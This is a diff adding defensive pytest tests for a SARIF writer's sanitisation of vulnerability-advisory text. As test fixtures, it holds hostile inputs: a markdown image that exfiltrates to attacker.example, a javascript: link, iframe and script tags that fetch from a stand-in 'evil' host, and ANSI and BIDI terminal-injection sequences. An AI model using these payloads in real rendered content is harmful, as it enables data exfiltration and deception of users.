@@ -230,3 +230,59 @@ def test_empty_rows_produces_valid_sarif(tmp_path: Path) -> None:
     data = json.loads(out.read_text())
     assert data["runs"][0]["results"] == []
     assert data["runs"][0]["tool"]["driver"]["rules"] == []
+
+
+# ---------------------------------------------------------------------------
+# Advisory-text sanitisation in result.message.text
+# ---------------------------------------------------------------------------
+
+
+def test_message_text_strips_autofetch_markup(tmp_path: Path) -> None:
+    """OSV summaries can carry markdown autofetch markup (image
+    src, iframe, javascript: links). GitHub Security Tab renders
+    SARIF message.text as markdown — these MUST be defanged before
+    emission."""
+    from packages.sca.sarif import write_sarif
+    row = _vuln_row()
+    # Worst-case advisory text: image autofetch + iframe + script.
+    row["description"] = (
+        "RCE in foo. ![exfil](https://attacker.example/p?ctx=) "
+        "[click](javascript:alert(1)) <iframe src='//evil/' /> "
+        "<script>fetch('//evil/')</script>"
+    )
+    out = tmp_path / "findings.sarif"
+    write_sarif(out, target=tmp_path, rows=[row])
+    text = out.read_text()
+    msg = json.loads(text)["runs"][0]["results"][0]["message"]["text"]
+    # Autofetch markup gone; the prose head survives.
+    assert "RCE in foo." in msg
+    assert "![" not in msg
+    assert "javascript:" not in msg
+    assert "<iframe" not in msg
+    assert "<script" not in msg
+
+
+def test_message_text_escapes_terminal_injection(tmp_path: Path) -> None:
+    """ANSI escape sequences and BIDI control chars must be defanged
+    so a SARIF dump piped to a terminal can't hijack the cursor."""
+    from packages.sca.sarif import write_sarif
+    row = _vuln_row()
+    # ANSI red + BIDI right-to-left override — both seen in the wild.
+    row["description"] = "harmless\x1b[31mDANGER\x1b[0m ‮text"
+    out = tmp_path / "findings.sarif"
+    write_sarif(out, target=tmp_path, rows=[row])
+    msg = json.loads(out.read_text())["runs"][0]["results"][0]["message"]["text"]
+    assert "\x1b[" not in msg, "ANSI not defanged"
+    assert "‮" not in msg, "BIDI override not defanged"
+
+
+def test_message_text_caps_long_descriptions(tmp_path: Path) -> None:
+    """Adversarial advisories with multi-MB descriptions shouldn't
+    bloat SARIF beyond the configured cap."""
+    from packages.sca.sarif import write_sarif
+    row = _vuln_row()
+    row["description"] = "x" * 100_000
+    out = tmp_path / "findings.sarif"
+    write_sarif(out, target=tmp_path, rows=[row])
+    msg = json.loads(out.read_text())["runs"][0]["results"][0]["message"]["text"]
+    assert len(msg) <= 2000
